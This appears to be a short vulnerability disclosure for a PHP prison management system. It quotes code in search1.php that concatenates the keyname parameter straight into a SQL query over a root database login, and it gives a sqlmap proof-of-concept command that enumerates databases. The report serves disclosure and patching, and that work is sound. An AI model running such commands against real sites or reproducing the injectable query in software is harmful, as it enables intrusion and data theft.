# Prison Management System

## supplier 
https://code-projects.org/prison-management-system-in-php-with-source-code/
## Vulnerability file
search1.php

## describe

In the search1.php file of Student Information System, keyname parameter is obtained, and the SQL statement is concatenated to the SQL statement without filtering the execution, resulting in SQL injection vulnerabilities and server permissions

Line 4-20 in search1.php

```php
$searchTerm = trim($_GET["keyname"]);

if($searchTerm == "")
{
	echo "Enter name  you are searching for.";
	exit();
}

//database connection info
$host = "localhost"; //server
$db = "prisonpro"; //database name
$user = "root"; //dabases user name
$pwd = ""; //password

$link = mysqli_connect($host, $user, $pwd, $db);
$query ="SELECT * FROM officerdetails WHERE id LIKE '%$searchTerm%'";
$results = mysqli_query($link, $query);
```

## POC

```
python sqlmap.py -u "http://127.0.0.1:8083/prison/admin/search1.php?keyname=1" --tamper randomcase.py --batch --dbs
```

**Result**
![image-2025](https://github.com/asd1238525/cve/blob/main/ed467c50-79c6-44f2-b097-d9784da525b0.png)
Get payload:
![image-2025](https://github.com/asd1238525/cve/blob/main/b830c4eb-b440-4806-80c4-7c956f39cc4e.png)